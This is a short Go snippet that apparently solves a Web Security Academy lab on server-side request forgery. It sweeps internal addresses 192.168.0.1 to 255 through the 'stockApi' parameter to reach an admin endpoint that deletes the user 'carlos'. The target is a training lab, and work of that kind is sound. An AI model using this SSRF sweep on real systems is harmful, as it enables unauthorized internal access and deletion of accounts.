...
func solve() error {
	baseUrl := "https://0a1a00380461ea53c138f8ad006300ba.web-security-academy.net"
	...
	for i:=1; i<256; i++ {
		...
		values.Set("stockApi", fmt.Sprintf("http://192.168.0.%d:8080/admin/delete?username=carlos", i))
		status, body, err := postForm(client, stockUrl, nil, values)
